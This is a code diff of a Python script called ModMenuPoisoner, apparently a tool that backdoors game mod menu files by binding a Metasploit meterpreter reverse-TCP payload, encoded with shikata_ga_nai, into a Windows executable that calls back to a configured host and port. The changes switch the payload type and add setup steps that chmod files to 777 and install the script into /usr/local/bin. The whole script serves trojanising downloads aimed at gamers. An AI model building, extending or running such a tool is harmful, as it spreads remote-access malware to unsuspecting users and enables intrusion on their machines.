@@ -11,7 +11,7 @@ import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
-payload_Generate = 'windows/meterpreter/reverse_http'
+payload_Generate = 'windows/meterpreter_reverse_tcp'
 LHOST = '8.8.8.8'
 LPORT = '443'
 # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
@@ -20,6 +20,9 @@ payload_Encoder = 'x86/shikata_ga_nai'
 payload_Iterations = '1'
 output_Format = 'exe'
 output_Dir = '/root/Documents/ModMenusReencoded/'
+
+os.system('cat /root/ModMenuPoisoner/banner.txt')
+
 def poison_mod():
     input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 
@@ -56,8 +59,11 @@ def open_dir():
 
 def setup():
     os.system('mkdir /root/Documents/ModMenusReencoded/')
+    os.system('chmod 777 /root/ModMenuPoisoner/*')
+    os.system('cp -r /root/ModMenuPoisoner/ModMenuPoisoner.py /usr/local/bin')
     print 'Setup complete'
     print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
+    print 'You can run Mod Menu Poisoner Now on terminal by typing: ModMenuPoisoner.py'
     main()
 def main():
     opt_List = [
